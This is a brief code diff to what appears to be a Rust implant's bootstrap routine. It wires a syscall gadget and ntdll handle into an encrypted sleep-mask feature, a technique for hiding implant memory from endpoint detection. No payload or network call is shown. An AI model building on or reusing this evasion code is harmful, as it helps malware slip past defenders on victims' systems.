@@ -254,7 +254,8 @@ unsafe fn bootstrap() -> Option<Instance> {
     // The encrypted sleep mask is a per-build choice (config `sleep_mask`,
     // on by default): off = plain indirect sleep cycles.
     let sleep_mask = if config::SLEEP_MASK {
-        let mut mask = crate::runtime::sleepmask::build_params();
+        let probe_gadget = syscalls::gadget(&syscall_table, 0);
+        let mut mask = crate::runtime::sleepmask::build_params(ntdll, probe_gadget, dbg);
         if let Some(ref mut m) = mask {
             m.ssn = syscall_table.delay_ssn;
         }
